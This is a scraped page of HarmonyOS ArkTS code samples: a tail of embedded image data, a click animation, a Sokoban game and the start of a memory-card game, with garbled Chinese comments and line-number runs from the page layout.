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&#x27; // åˆå§‹åŒ–æ–¹æ³•ï¼Œåœ¨ç»„ä»¶å³å°†æ˜¾ç¤ºæ—¶è¢«è°ƒç”¨ aboutToAppear(): void &#123; for (let i = 0; i &lt; this.count; i++) &#123; this.list.push(new Cell()); // åˆå§‹åŒ– Cell æ•°ç»„ &#125; &#125; // æ„å»º UI çš„æ–¹æ³• build() &#123; Column() &#123; // åˆ›å»ºä¸€ä¸ªå‚ç›´å¸ƒå±€å®¹å™¨ Stack() &#123; // åˆ›å»ºä¸€ä¸ªå †æ ˆå¸ƒå±€å®¹å™¨ ForEach(this.list, (item: Cell, _index: number) =&gt; &#123; // éå† list ä¸­çš„æ¯ä¸€ä¸ª Cell Text(item.value)// æ˜¾ç¤º Cell ä¸­çš„æ–‡å­— .fontColor(Color.White)// è®¾ç½®æ–‡å­—é¢œè‰²ä¸ºç™½è‰² .fontSize(&#x27;50lpx&#x27;)// è®¾ç½®æ–‡å­—å¤§å° .translate(&#123; x: 0, y: `$&#123;item.y&#125;lpx` &#125;)// è®¾ç½®æ–‡å­—çš„å‚ç›´åç§»é‡ .opacity(item.opacity) // è®¾ç½®æ–‡å­—çš„é€æ˜åº¦ &#125;) &#125; .width(&#x27;300lpx&#x27;) // è®¾ç½®å †æ ˆå¸ƒå±€å®¹å™¨çš„å®½åº¦ .height(&#x27;300lpx&#x27;) // è®¾ç½®å †æ ˆå¸ƒå±€å®¹å™¨çš„é«˜åº¦ .align(Alignment.BottomEnd) // è®¾ç½®å¯¹é½æ–¹å¼ä¸ºåº•éƒ¨å³ç«¯ Image(this.image)// æ˜¾ç¤ºå›¾ç‰‡ .width(&#x27;300lpx&#x27;)// è®¾ç½®å›¾ç‰‡å®½åº¦ .height(&#x27;300lpx&#x27;)// è®¾ç½®å›¾ç‰‡é«˜åº¦ .objectFit(ImageFit.Contain)// å›¾ç‰‡é€‚åº”å®¹å™¨ .clickEffect(&#123; // ç‚¹å‡»æ•ˆæœé…ç½® scale: 0.5, // ç¼©æ”¾æ¯”ä¾‹ level: ClickEffectLevel.LIGHT // æ•ˆæœçº§åˆ« &#125;) .onClick(() =&gt; &#123; // ç‚¹å‡»å›¾ç‰‡æ—¶è§¦å‘çš„å›è°ƒ let index = this.indexCount % this.count; // è®¡ç®—å½“å‰æ»šåŠ¨çš„ç´¢å¼• this.indexCount++; // æ›´æ–°ç´¢å¼•è®¡æ•°å™¨ animateToImmediately(&#123; // ç«‹å³å¼€å§‹åŠ¨ç”» duration: 0, // åŠ¨ç”»æŒç»­æ—¶é—´ä¸º0æ¯«ç§’ onFinish: () =&gt; &#123; // åŠ¨ç”»å®Œæˆåçš„å›è°ƒ animateToImmediately(&#123; // å†æ¬¡ç«‹å³å¼€å§‹åŠ¨ç”» duration: 1000, // åŠ¨ç”»æŒç»­æ—¶é—´ä¸º1000æ¯«ç§’ &#125;, () =&gt; &#123; this.list[index].y = -200 // è®¾ç½® Cell çš„å‚ç›´åç§»é‡ this.list[index].opacity = 0 // è®¾ç½® Cell çš„é€æ˜åº¦ &#125;) &#125; &#125;, () =&gt; &#123; this.list[index].y = 0 // è®¾ç½® Cell çš„å‚ç›´åç§»é‡ this.list[index].opacity = 1 // è®¾ç½® Cell çš„é€æ˜åº¦ &#125;) &#125;) &#125; .height(&#x27;100%&#x27;) // è®¾ç½®å®¹å™¨é«˜åº¦ä¸º100% .width(&#x27;100%&#x27;) // è®¾ç½®å®¹å™¨å®½åº¦ä¸º100% .backgroundColor(Color.Black) // è®¾ç½®èƒŒæ™¯é¢œè‰²ä¸ºé»‘è‰² &#125;&#125; Sokobanæ¨ç®±å­ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308 import &#123; promptAction &#125; from &#x27;@kit.ArkUI&#x27; // å¯¼å…¥ArkUIå·¥å…·åŒ…ä¸­çš„æç¤ºæ“ä½œæ¨¡å—@ObservedV2 // è§‚å¯Ÿè€…æ¨¡å¼è£…é¥°å™¨class Cell &#123; // å®šä¹‰æ¸¸æˆä¸­çš„å•å…ƒæ ¼ç±» @Trace // è·Ÿè¸ªè£…é¥°å™¨ï¼Œæ ‡è®°å±æ€§ä»¥è¢«è·Ÿè¸ª type: number = 0; // å•å…ƒæ ¼ç±»å‹ï¼Œ0ï¼šé€æ˜ï¼Œ1ï¼šå¢™ï¼Œ2ï¼šå¯ç§»åŠ¨åŒºåŸŸ @Trace topLeft: number = 0; // å·¦ä¸Šè§’åœ†è§’å¤§å° @Trace topRight: number = 0; // å³ä¸Šè§’åœ†è§’å¤§å° @Trace bottomLeft: number = 0; // å·¦ä¸‹è§’åœ†è§’å¤§å° @Trace bottomRight: number = 0; // å³ä¸‹è§’åœ†è§’å¤§å° @Trace x: number = 0; // å•å…ƒæ ¼çš„Xåæ ‡åç§»é‡ @Trace y: number = 0; // å•å…ƒæ ¼çš„Yåæ ‡åç§»é‡ constructor(cellType: number) &#123; // æ„é€ å‡½æ•° this.type = cellType; // åˆå§‹åŒ–å•å…ƒæ ¼ç±»å‹ &#125;&#125;@ObservedV2 // è§‚å¯Ÿè€…æ¨¡å¼è£…é¥°å™¨class MyPosition &#123; // å®šä¹‰ä½ç½®ç±» @Trace // è·Ÿè¸ªè£…é¥°å™¨ï¼Œæ ‡è®°å±æ€§ä»¥è¢«è·Ÿè¸ª x: number = 0; // Xåæ ‡ @Trace y: number = 0; // Yåæ ‡ setPosition(x: number, y: number) &#123; // è®¾ç½®ä½ç½®çš„æ–¹æ³• this.x = x; // æ›´æ–°Xåæ ‡ this.y = y; // æ›´æ–°Yåæ ‡ &#125;&#125;@Entry // å…¥å£è£…é¥°å™¨@Component // ç»„ä»¶è£…é¥°å™¨struct Sokoban &#123; // å®šä¹‰æ¸¸æˆä¸»ç»“æ„ cellWidth: number = 100; // å•å…ƒæ ¼å®½åº¦ @State grid: Cell[][] = [ // æ¸¸æˆç½‘æ ¼çŠ¶æ€ [new Cell(0), new Cell(1), new Cell(1), new Cell(1), new Cell(1), new Cell(1)], [new Cell(1), new Cell(1), new Cell(2), new Cell(2), new Cell(2), new Cell(1)], [new Cell(1), new Cell(2), new Cell(2), new Cell(2), new Cell(1), new Cell(1)], [new Cell(1), new Cell(2), new Cell(2), new Cell(2), new Cell(2), new Cell(1)], [new Cell(1), new Cell(1), new Cell(2), new Cell(2), new Cell(2), new Cell(1)], [new Cell(0), new Cell(1), new Cell(1), new Cell(1), new Cell(1), new Cell(1)], ]; @State victoryPositions: MyPosition[] = [new MyPosition(), new MyPosition()]; // èƒœåˆ©ä½ç½®æ•°ç»„ @State cratePositions: MyPosition[] = [new MyPosition(), new MyPosition()]; // ç®±å­ä½ç½®æ•°ç»„ playerPosition: MyPosition = new MyPosition(); // ç©å®¶ä½ç½® @State screenStartX: number = 0; // è§¦æ‘¸å¼€å§‹æ—¶çš„å±å¹•Xåæ ‡ @State screenStartY: number = 0; // è§¦æ‘¸å¼€å§‹æ—¶çš„å±å¹•Yåæ ‡ @State lastScreenX: number = 0; // è§¦æ‘¸ç»“æŸæ—¶çš„å±å¹•Xåæ ‡ @State lastScreenY: number = 0; // è§¦æ‘¸ç»“æŸæ—¶çš„å±å¹•Yåæ ‡ @State startTime: number = 0; // æ¸¸æˆå¼€å§‹æ—¶é—´ isAnimationRunning: boolean = false // åŠ¨ç”»æ˜¯å¦æ­£åœ¨è¿è¡Œ aboutToAppear(): void &#123; // æ¸¸æˆåŠ è½½å‰çš„å‡†å¤‡å·¥ä½œ // åˆå§‹åŒ–æŸäº›å•å…ƒæ ¼çš„åœ†è§’å¤§å°... this.grid[0][1].topLeft = 25; this.grid[0][5].topRight = 25; this.grid[1][0].topLeft = 25; this.grid[4][0].bottomLeft = 25; this.grid[5][1].bottomLeft = 25; this.grid[5][5].bottomRight = 25; this.grid[1][1].bottomRight = 10; this.grid[4][1].topRight = 10; this.grid[2][4].topLeft = 10; this.grid[2][4].bottomLeft = 10; this.initializeGame(); // åˆå§‹åŒ–æ¸¸æˆ &#125; initializeGame() &#123; // åˆå§‹åŒ–æ¸¸æˆçŠ¶æ€ this.startTime = Date.now(); // è®¾ç½®æ¸¸æˆå¼€å§‹æ—¶é—´ä¸ºå½“å‰æ—¶é—´ // è®¾ç½®èƒœåˆ©ä½ç½®å’Œç®±å­ä½ç½®... this.startTime = Date.now(); // è®¾ç½®æ¸¸æˆå¼€å§‹æ—¶é—´ä¸ºå½“å‰æ—¶é—´ this.victoryPositions[0].setPosition(1, 3); this.victoryPositions[1].setPosition(1, 4); this.cratePositions[0].setPosition(2, 2); this.cratePositions[1].setPosition(2, 3); this.playerPosition.setPosition(1, 2); &#125; isVictoryPositionVisible(x: number, y: number): boolean &#123; // åˆ¤æ–­ä½ç½®æ˜¯å¦ä¸ºèƒœåˆ©ä½ç½® return this.victoryPositions.some(position =&gt; position.x === x &amp;&amp; position.y === y); // è¿”å›æ˜¯å¦æœ‰èƒœåˆ©ä½ç½®ä¸ç»™å®šä½ç½®åŒ¹é… &#125; isCratePositionVisible(x: number, y: number): boolean &#123; // åˆ¤æ–­ä½ç½®æ˜¯å¦ä¸ºç®±å­ä½ç½® return this.cratePositions.some(position =&gt; position.x === x &amp;&amp; position.y === y); // è¿”å›æ˜¯å¦æœ‰ç®±å­ä½ç½®ä¸ç»™å®šä½ç½®åŒ¹é… &#125; isPlayerPositionVisible(x: number, y: number): boolean &#123; // åˆ¤æ–­ä½ç½®æ˜¯å¦ä¸ºç©å®¶ä½ç½® return this.playerPosition.x === x &amp;&amp; this.playerPosition.y === y; // è¿”å›ç©å®¶ä½ç½®æ˜¯å¦ä¸ç»™å®šä½ç½®ç›¸åŒ &#125; movePlayer(direction: string) &#123; const directions: object = Object(&#123; &#x27;right&#x27;: Object(&#123; dx: 0, dy: 1&#125;), &#x27;left&#x27;: Object(&#123; dx:0 , dy:-1 &#125;), &#x27;down&#x27;: Object(&#123; dx: 1, dy: 0 &#125;), &#x27;up&#x27;: Object(&#123; dx: -1, dy: 0 &#125;) &#125;); const dx: number = directions[direction][&#x27;dx&#x27;]; //&#123; dx, dy &#125; const dy: number = directions[direction][&#x27;dy&#x27;]; //&#123; dx, dy &#125; const newX: number = this.playerPosition.x + dx; const newY: number = this.playerPosition.y + dy; const targetCell = this.grid[newX][newY]; // æ£€æŸ¥æ–°ä½ç½®æ˜¯å¦è¶…å‡ºè¾¹ç•Œ if (!targetCell) &#123; return; &#125; // å¦‚æœæ–°ä½ç½®æ˜¯å¢™ï¼Œåˆ™ä¸èƒ½ç§»åŠ¨ if (targetCell.type === 1) &#123; return; &#125; let crateIndex = -1; if (this.isCratePositionVisible(newX, newY)) &#123; const crateBehindCell = this.grid[newX + dx][newY + dy]; if (!crateBehindCell || crateBehindCell.type !== 2) &#123; return; &#125; crateIndex = this.cratePositions.findIndex(crate =&gt; crate.x === newX &amp;&amp; crate.y === newY); if (crateIndex === -1 || this.isCratePositionVisible(newX + dx, newY + dy)) &#123; return; &#125; &#125; if (this.isAnimationRunning) &#123; return &#125; this.isAnimationRunning = true animateToImmediately(&#123; duration: 150, onFinish: () =&gt; &#123; animateToImmediately(&#123; duration: 0, onFinish: () =&gt; &#123; this.isAnimationRunning = false &#125; &#125;, () =&gt; &#123; if (crateIndex !== -1) &#123; this.grid[this.cratePositions[crateIndex].x][this.cratePositions[crateIndex].y].x = 0; this.grid[this.cratePositions[crateIndex].x][this.cratePositions[crateIndex].y].y = 0; this.cratePositions[crateIndex].x += dx; this.cratePositions[crateIndex].y += dy; &#125; this.grid[this.playerPosition.x][this.playerPosition.y].x = 0 this.grid[this.playerPosition.x][this.playerPosition.y].y = 0 this.playerPosition.setPosition(newX, newY); // æ£€æŸ¥æ˜¯å¦è·èƒœ const isAllCrateOnTarget = this.cratePositions.every(crate =&gt; &#123; return this.victoryPositions.some(victory =&gt; crate.x === victory.x &amp;&amp; crate.y === victory.y); &#125;); if (isAllCrateOnTarget) &#123; console.log(&quot;æ­å–œä½ ï¼Œä½ èµ¢äº†ï¼&quot;); // å¯ä»¥åœ¨è¿™é‡Œæ·»åŠ èƒœåˆ©å¤„ç†é€»è¾‘ promptAction.showDialog(&#123; // æ˜¾ç¤ºå¯¹è¯æ¡† title: &#x27;æ¸¸æˆèƒœåˆ©ï¼&#x27;, // å¯¹è¯æ¡†æ ‡é¢˜ message: &#x27;æ­å–œä½ ï¼Œç”¨æ—¶ï¼š&#x27; + ((Date.now() - this.startTime) / 1000).toFixed(3) + &#x27;ç§’&#x27;, // å¯¹è¯æ¡†æ¶ˆæ¯ buttons: [&#123; text: &#x27;é‡æ–°å¼€å§‹&#x27;, color: &#x27;#ffa500&#x27; &#125;] // å¯¹è¯æ¡†æŒ‰é’® &#125;).then(() =&gt; &#123; // å¯¹è¯æ¡†å…³é—­åæ‰§è¡Œ this.initializeGame(); // é‡æ–°å¼€å§‹æ¸¸æˆ &#125;); &#125; &#125;) &#125; &#125;, () =&gt; &#123; this.grid[this.playerPosition.x][this.playerPosition.y].x = dy * this.cellWidth; this.grid[this.playerPosition.x][this.playerPosition.y].y = dx * this.cellWidth; if (crateIndex !== -1) &#123; this.grid[this.cratePositions[crateIndex].x][this.cratePositions[crateIndex].y].x = dy * this.cellWidth; this.grid[this.cratePositions[crateIndex].x][this.cratePositions[crateIndex].y].y = dx * this.cellWidth; &#125; console.info(`dx:$&#123;dx&#125;,dy:$&#123;dy&#125;`) &#125;) &#125; build() &#123; Column(&#123; space: 20 &#125;) &#123; //æ¸¸æˆåŒº Stack() &#123; //éé›¶åŒºåŠ ç“·ç – Column() &#123; ForEach(this.grid, (row: [], rowIndex: number) =&gt; &#123; Row() &#123; ForEach(row, (item: Cell, colIndex: number) =&gt; &#123; Stack() &#123; Text() .width(`$&#123;this.cellWidth&#125;lpx`) .height(`$&#123;this.cellWidth&#125;lpx`) .backgroundColor(item.type == 0 ? Color.Transparent : ((rowIndex + colIndex) % 2 == 0 ? &quot;#cfb381&quot; : &quot;#e1ca9f&quot;)) .borderRadius(&#123; topLeft: item.topLeft &gt; 10 ? item.topLeft : 0, topRight: item.topRight &gt; 10 ? item.topRight : 0, bottomLeft: item.bottomLeft &gt; 10 ? item.bottomLeft : 0, bottomRight: item.bottomRight &gt; 10 ? item.bottomRight : 0 &#125;) //å¦‚æœå’Œæ˜¯èƒœåˆ©åæ ‡ï¼Œæ˜¾ç¤ºå‰å· Stack() &#123; Text() .width(`$&#123;this.cellWidth / 2&#125;lpx`) .height(`$&#123;this.cellWidth / 8&#125;lpx`) .backgroundColor(Color.White) Text() .width(`$&#123;this.cellWidth / 8&#125;lpx`) .height(`$&#123;this.cellWidth / 2&#125;lpx`) .backgroundColor(Color.White) &#125;.rotate(&#123; angle: 45 &#125;) .visibility(this.isVictoryPositionVisible(rowIndex, colIndex) ? Visibility.Visible : Visibility.None) &#125; &#125;) &#125; &#125;) &#125; Column() &#123; ForEach(this.grid, (row: [], rowIndex: number) =&gt; &#123; Row() &#123; ForEach(row, (item: Cell, colIndex: number) =&gt; &#123; //æ˜¯å¦æ˜¾ç¤ºç®±å­ Stack() &#123; Text() .width(`$&#123;this.cellWidth&#125;lpx`) .height(`$&#123;this.cellWidth&#125;lpx`) .backgroundColor(item.type == 1 ? &quot;#412c0f&quot; : Color.Transparent) .borderRadius(&#123; topLeft: item.topLeft, topRight: item.topRight, bottomLeft: item.bottomLeft, bottomRight: item.bottomRight &#125;) Text(&#x27;ç®±&#x27;) .fontColor(Color.White) .textAlign(TextAlign.Center) .fontSize(`$&#123;this.cellWidth / 2&#125;lpx`) .width(`$&#123;this.cellWidth - 5&#125;lpx`) .height(`$&#123;this.cellWidth - 5&#125;lpx`) .backgroundColor(&quot;#cb8321&quot;)//#995d12 #cb8321 .borderRadius(10) .visibility(this.isCratePositionVisible(rowIndex, colIndex) ? Visibility.Visible : Visibility.None) Text(&#x27;æˆ‘&#x27;) .fontColor(Color.White) .textAlign(TextAlign.Center) .fontSize(`$&#123;this.cellWidth / 2&#125;lpx`) .width(`$&#123;this.cellWidth - 5&#125;lpx`) .height(`$&#123;this.cellWidth - 5&#125;lpx`) .backgroundColor(&quot;#007dfe&quot;)//#995d12 #cb8321 .borderRadius(10) .visibility(this.isPlayerPositionVisible(rowIndex, colIndex) ? Visibility.Visible : Visibility.None) &#125; .width(`$&#123;this.cellWidth&#125;lpx`) .height(`$&#123;this.cellWidth&#125;lpx`) .translate(&#123; x: `$&#123;item.x&#125;lpx`, y: `$&#123;item.y&#125;lpx` &#125;) &#125;) &#125; &#125;) &#125; &#125; Button(&#x27;é‡æ–°å¼€å§‹&#x27;).clickEffect(&#123; level: ClickEffectLevel.MIDDLE &#125;) .onClick(() =&gt; &#123; this.initializeGame(); &#125;); &#125; .width(&#x27;100%&#x27;) .height(&#x27;100%&#x27;) .backgroundColor(&quot;#fdb300&quot;) .padding(&#123; top: 20 &#125;) .onTouch((e) =&gt; &#123; if (e.type === TouchType.Down &amp;&amp; e.touches.length &gt; 0) &#123; // è§¦æ‘¸å¼€å§‹ï¼Œè®°å½•åˆå§‹ä½ç½® this.screenStartX = e.touches[0].x; this.screenStartY = e.touches[0].y; &#125; else if (e.type === TouchType.Up &amp;&amp; e.changedTouches.length &gt; 0) &#123; // å½“æ‰‹æŒ‡æŠ¬èµ·æ—¶ï¼Œæ›´æ–°æœ€åçš„ä½ç½® this.lastScreenX = e.changedTouches[0].x; this.lastScreenY = e.changedTouches[0].y; &#125; &#125;) .gesture( SwipeGesture(&#123; direction: SwipeDirection.All &#125;)// æ”¯æŒæ–¹å‘ä¸­ allå¯ä»¥æ˜¯ä¸Šä¸‹å·¦å³ .onAction((_event: GestureEvent) =&gt; &#123; const swipeX = this.lastScreenX - this.screenStartX; const swipeY = this.lastScreenY - this.screenStartY; // æ¸…é™¤å¼€å§‹ä½ç½®è®°å½•ï¼Œå‡†å¤‡ä¸‹ä¸€æ¬¡æ»‘åŠ¨åˆ¤æ–­ this.screenStartX = 0; this.screenStartY = 0; if (Math.abs(swipeX) &gt; Math.abs(swipeY)) &#123; if (swipeX &gt; 0) &#123; // å‘å³æ»‘åŠ¨ this.movePlayer(&#x27;right&#x27;); &#125; else &#123; // å‘å·¦æ»‘åŠ¨ this.movePlayer(&#x27;left&#x27;); &#125; &#125; else &#123; if (swipeY &gt; 0) &#123; // å‘ä¸‹æ»‘åŠ¨ this.movePlayer(&#x27;down&#x27;); &#125; else &#123; // å‘ä¸Šæ»‘åŠ¨ this.movePlayer(&#x27;up&#x27;); &#125; &#125; &#125;) ) &#125;&#125; Memory Flipè®°å¿†ç¿»è½¬ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229import &#123; promptAction &#125; from &#x27;@kit.ArkUI&#x27; // å¯¼å…¥ç”¨äºæ˜¾ç¤ºå¯¹è¯æ¡†çš„æ¨¡å—// ä½¿ç”¨è£…é¥°å™¨æ¥è§‚å¯Ÿæ•°æ®å˜åŒ–@ObservedV2class GameCell &#123; // å®šä¹‰å•å…ƒæ ¼ç±» @Trace value: string; // å•å…ƒæ ¼çš„å€¼ï¼Œå³å¡ç‰‡ä¸Šçš„å›¾æ¡ˆ @Trace isVisible: boolean = false; // æ§åˆ¶å¡ç‰‡æ˜¯å¦å¯è§ isFrontVisible: boolean = false; // æ§åˆ¶å¡ç‰‡æ˜¯å¦æ­£é¢æœä¸Š isMatched: boolean = false; // æ ‡è®°å¡ç‰‡æ˜¯å¦å·²è¢«åŒ¹é… isAnimationRunning: boolean = false; // åŠ¨ç”»æ˜¯å¦æ­£åœ¨è¿è¡Œ @Trace rotationAngle: number = 0; // å¡ç‰‡çš„æ—‹è½¬è§’åº¦ constructor(value: string) &#123; // æ„é€ å‡½æ•°ï¼Œåˆå§‹åŒ–å•å…ƒæ ¼ this.value = value; // è®¾ç½®å•å…ƒæ ¼çš„å€¼ &#125; // å±•ç¤ºå¡ç‰‡æ­£é¢çš„æ–¹æ³• revealFace(animationTime: number, callback?: () =&gt; void) &#123; if (this.isAnimationRunning) &#123; // å¦‚æœå·²ç»æœ‰åŠ¨ç”»åœ¨è¿è¡Œï¼Œåˆ™è¿”å› return; &#125; this.isAnimationRunning = true; // è®¾ç½®åŠ¨ç”»çŠ¶æ€ä¸ºè¿è¡Œä¸­ animateToImmediately(&#123; // å¼€å§‹åŠ¨ç”» duration: animationTime, // åŠ¨ç”»æŒç»­æ—¶é—´ iterations: 1, // åŠ¨ç”»è¿­ä»£æ¬¡æ•° curve: Curve.Linear, // åŠ¨ç”»æ›²çº¿ç±»å‹ onFinish: () =&gt; &#123; // åŠ¨ç”»å®Œæˆåçš„å›è°ƒ animateToImmediately(&#123; // å†æ¬¡å¼€å§‹åŠ¨ç”» duration: animationTime, // åŠ¨ç”»æŒç»­æ—¶é—´ iterations: 1, // åŠ¨ç”»è¿­ä»£æ¬¡æ•° curve: Curve.Linear, // åŠ¨ç”»æ›²çº¿ç±»å‹ onFinish: () =&gt; &#123; // åŠ¨ç”»å®Œæˆåçš„å›è°ƒ this.isFrontVisible = true; // è®¾ç½®å¡ç‰‡ä¸ºæ­£é¢æœä¸Š this.isAnimationRunning = false; // è®¾ç½®åŠ¨ç”»çŠ¶æ€ä¸ºåœæ­¢ if (callback) &#123; // å¦‚æœæœ‰å›è°ƒå‡½æ•°ï¼Œåˆ™æ‰§è¡Œ callback(); &#125; &#125; &#125;, () =&gt; &#123; // åŠ¨ç”»å¼€å§‹æ—¶çš„å›è°ƒ this.isVisible = true; // è®¾ç½®å¡ç‰‡ä¸ºå¯è§ this.rotationAngle = 0; // è®¾ç½®æ—‹è½¬è§’åº¦ä¸º0 &#125;); &#125; &#125;, () =&gt; &#123; // åŠ¨ç”»å¼€å§‹æ—¶çš„å›è°ƒ this.isVisible = false; // è®¾ç½®å¡ç‰‡ä¸ºä¸å¯è§ this.rotationAngle = 90; // 